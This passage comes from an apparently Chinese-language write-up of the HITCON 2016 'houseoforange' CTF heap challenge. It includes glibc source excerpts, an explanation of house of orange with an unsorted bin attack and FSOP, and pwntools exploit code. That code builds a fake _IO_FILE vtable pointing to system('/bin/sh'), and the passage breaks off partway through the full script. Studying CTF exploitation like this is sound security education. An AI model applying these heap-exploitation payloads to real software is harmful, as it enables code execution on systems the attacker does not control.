</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=nf>_IO_flush_all_lockp</span> <span class=p>(</span><span class=kt>int</span> <span class=n>do_lock</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=n>fp</span> <span class=o>=</span> <span class=p>(</span><span class=n>_IO_FILE</span> <span class=o>*</span><span class=p>)</span> <span class=n>_IO_list_all</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=n>fp</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=p>...</span>
</span></span><span class=line><span class=cl>       <span class=k>if</span> <span class=p>(((</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>               <span class=o>&amp;&amp;</span> <span class=nf>_IO_OVERFLOW</span> <span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>EOF</span><span class=p>)</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>           <span class=p>{</span>
</span></span><span class=line><span class=cl>               <span class=n>result</span> <span class=o>=</span> <span class=n>EOF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/abort_routine.001.jpeg></p><h2 id=hitcon2016-houseoforange>Hitcon2016 houseoforange<a hidden class=anchor aria-hidden=true href=#hitcon2016-houseoforange>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     amd64-64-little
</span></span><span class=line><span class=cl>RELRO:    Full RELRO
</span></span><span class=line><span class=cl>Stack:    Canary found
</span></span><span class=line><span class=cl>NX:       NX enabled
</span></span><span class=line><span class=cl>PIE:      PIE enabled
</span></span><span class=line><span class=cl>FORTIFY:  Enabled
</span></span></code></pre></td></tr></table></div></div><h3 id=分析>分析<a hidden class=anchor aria-hidden=true href=#分析>#</a></h3><p>关键数据结构</p><p><img alt=image-20200725225408295 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725225408295.png></p><p>功能</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> 1. Build the house                  
</span></span><span class=line><span class=cl> 2. See the house                    
</span></span><span class=line><span class=cl> 3. Upgrade the house                
</span></span><span class=line><span class=cl> 4. Give up
</span></span></code></pre></td></tr></table></div></div><p>Build：输入名称长度size，依次经过malloc(0x10)、malloc(size)、calloc(0x8)，然后读入名称等。</p><p>See：输出名称等。</p><p>Upgrade：对名称进行修改，可以输入任意长度字符，也就是堆上任意长度的溢出。</p><h3 id=总体思路>总体思路<a hidden class=anchor aria-hidden=true href=#总体思路>#</a></h3><p>使用house of orange使得old top chunk进入unsorted bin。分配large size的块，泄露libc base和heap addr。</p><p>使用unsorted bin attack修改<code>_IO_list_all</code>，攻击后它将指向unsorted bin在main_arena中的头结点。unsorted bin attack的同时，在同一个chunk上伪造 <code>struct _IO_FILE_plus</code>结构。修改该<code>chunk->size</code>为0x61使其落入small bin(0x60)也就是unsorted bin头结点地址+0x68（相当于修改<code>struct _IO_FILE</code>中chain）。</p><h3 id=house-of-orange-1>house of orange<a hidden class=anchor aria-hidden=true href=#house-of-orange-1>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>build</span><span class=p>(</span><span class=mh>0x200</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>  <span class=c1># 在top chunk总共分配0x200</span>
</span></span><span class=line><span class=cl><span class=n>upgrade</span><span class=p>(</span><span class=mh>0x1b0</span><span class=o>+</span><span class=mh>0x20</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x1d8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xe01</span><span class=p>))</span> <span class=c1># 覆盖topchunk-&gt;size为0xe01</span>
</span></span><span class=line><span class=cl><span class=n>build</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>                      <span class=c1># 分配一个大于0xe00的块，触发house of orange</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=leak-libc-and-heap>leak libc and heap<a hidden class=anchor aria-hidden=true href=#leak-libc-and-heap>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># leak libc base </span>
</span></span><span class=line><span class=cl><span class=n>build</span><span class=p>(</span><span class=mh>0x400</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name of house : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>8</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span> <span class=n>libc_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x3C5178</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0x39C178</span>
</span></span><span class=line><span class=cl><span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># leak heap addr</span>
</span></span><span class=line><span class=cl><span class=n>upgrade</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name of house : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>16</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>pf</span><span class=p>(</span><span class=s2>&#34;heap addr&#34;</span><span class=p>,</span> <span class=n>heap_addr</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>分配large size的块，泄露libc base和heap addr，因为large bin会将fd_nextsize和bk_nextsize存储在chunk中（unsorted bin中的唯一chunk被取出放在large bin中，然后切割分配。如果是small size，则会在unsorted bin 中直接切割分配）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   If a small request, try to use last remainder if it is the
</span></span></span><span class=line><span class=cl><span class=cm>   only chunk in unsorted bin.  This helps promote locality for
</span></span></span><span class=line><span class=cl><span class=cm>   runs of consecutive small requests. This is the only
</span></span></span><span class=line><span class=cl><span class=cm>   exception to best-fit, and applies only when there is
</span></span></span><span class=line><span class=cl><span class=cm>   no exact fit for a small chunk.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>in_smallbin_range</span> <span class=p>(</span><span class=n>nb</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=n>bck</span> <span class=o>==</span> <span class=nf>unsorted_chunks</span> <span class=p>(</span><span class=n>av</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=n>victim</span> <span class=o>==</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>last_remainder</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>size</span><span class=p>)</span> <span class=o>&gt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>nb</span> <span class=o>+</span> <span class=n>MINSIZE</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=unsorted-bin-attack--fsop>unsorted bin attack && FSOP<a hidden class=anchor aria-hidden=true href=#unsorted-bin-attack--fsop>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x420</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;/bin/sh</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span>      <span class=c1># start offset: 0x0--fake size</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;_IO_list_all&#34;</span><span class=p>]</span><span class=o>-</span><span class=mh>0x10</span><span class=p>)</span>  <span class=c1># start offset: 0x10--unsorted bin attack</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x90</span>  <span class=c1># start offset: 0x20--满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x10</span>    <span class=c1># start offset: 0xc0--满足fp-&gt;_mode &lt;= 0</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_addr</span><span class=o>+</span><span class=mh>0x430</span><span class=o>+</span><span class=mh>0xe0</span><span class=p>)</span>  <span class=c1># start offset: 0xd8--vtable</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;system&#34;</span><span class=p>])</span><span class=o>*</span><span class=mi>4</span> <span class=c1># start offset: 0xe0--_IO_OVERFLOW=system</span>
</span></span><span class=line><span class=cl><span class=n>upgrade</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/listall.001.jpeg></p><h3 id=error>error<a hidden class=anchor aria-hidden=true href=#error>#</a></h3><p>概率性的出错，有时候<code>_IO_list_all</code>指向的第一个<code>struct _IO_FILE_plus</code>会满足<code>_IO_OVERFLOW</code>的执行条件，而我们伪造的在第二个，从而执行出错。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(((</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span> <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	   <span class=o>||</span> <span class=p>(</span><span class=nf>_IO_vtable_offset</span> <span class=p>(</span><span class=n>fp</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>	       <span class=o>&amp;&amp;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_mode</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>fp</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_ptr</span>
</span></span><span class=line><span class=cl>				    <span class=o>&gt;</span> <span class=n>fp</span><span class=o>-&gt;</span><span class=n>_wide_data</span><span class=o>-&gt;</span><span class=n>_IO_write_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>     <span class=p>)</span>
</span></span><span class=line><span class=cl>	  <span class=o>&amp;&amp;</span> <span class=nf>_IO_OVERFLOW</span> <span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=n>EOF</span><span class=p>)</span> <span class=o>==</span> <span class=n>EOF</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>在我调试过程中发现<code>_IO_vtable_offset(fp) == 0</code>这个验证不存在，下图中的条件编译应该是选择了后者。</p><p><img alt=image-20200725235629121 loading=lazy src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200725235629121.png></p><p><code>fp->_mode > 0</code>中的_mode是int类型，依赖于libc地址随机。如果恰巧最高位为0，这个条件也就被满足了。</p><p><code>fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base</code>正好指向bin，因为bin是空的都指向自身，而<code>_IO_write_base</code>位于<code>_IO_write_ptr</code>的低地址处，所以这个条件一定被满足。</p><p>综上，只要随机到_mode所处位置的最高位为0，就会失败。</p><h3 id=exploit>exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h3><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2016%20house_of_orange/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;info&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;houseoforange&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>           <span class=c1># GLIBC 2.23-0ubuntu11.2</span>
</span></span><span class=line><span class=cl><span class=c1># locallibc = &#34;../glibc_versions/2.23/x64_notcache/lib/libc-2.23.so&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build</span><span class=p>(</span><span class=n>length</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Length of name :&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name :&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Price of Orange:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Color of Orange:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upgrade</span><span class=p>(</span><span class=n>length</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Length of name :&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Price of Orange: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Color of Orange: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>build</span><span class=p>(</span><span class=mh>0x200</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mh>0x20</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>upgrade</span><span class=p>(</span><span class=mh>0x1b0</span><span class=o>+</span><span class=mh>0x20</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x1d8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xe01</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>build</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b genops.c:759&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *$rebase(0x13D5)&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># leak libc base </span>
</span></span><span class=line><span class=cl>    <span class=n>build</span><span class=p>(</span><span class=mh>0x400</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Name of house : &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[</span><span class=mi>8</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
